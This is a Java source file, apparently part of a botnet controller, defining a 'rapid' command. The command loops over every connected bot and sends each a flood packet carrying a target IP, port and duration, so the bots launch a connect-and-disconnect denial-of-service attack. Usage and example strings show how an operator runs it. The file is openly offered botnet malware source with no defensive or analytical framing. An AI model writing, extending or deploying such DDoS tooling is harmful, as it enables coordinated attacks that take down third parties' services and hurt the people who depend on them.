package com.redpois0n.commands;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.common.packets.Headers;
import com.redpois0n.exceptions.IllegalArgumentLengthException;


public class CommandRapid extends Command {

	/**
	 * Begins rapid flood
	 */
	@Override
	public void execute(String[] args, Bot[] bots) throws Exception {
		if (args.length != 3) {
			throw new IllegalArgumentLengthException();
		}

		int port = Integer.parseInt(args[1]);
		int time = Integer.parseInt(args[2]);

		for (int i = 0; i < bots.length; i++) {
			try {
				Bot bot = bots[i];
				bot.writeByte(Headers.PACKET_RAPID_FLOOD);
				bot.writeString(args[0]);
				bot.writeInt(port);
				bot.writeInt(time);
			} catch (Exception ex) {
				Main.handleException(ex);
			}
		}
	}

	@Override
	public String getUsage() {
		return "rapid [IP] [PORT] [SECONDS]";
	}

	@Override
	public String getExample() {
		return "rapid 127.0.0.1 80 10";
	}

	@Override
	public String getDescription() {
		return "Launches rapid connect and disconnect flood";
	}

}
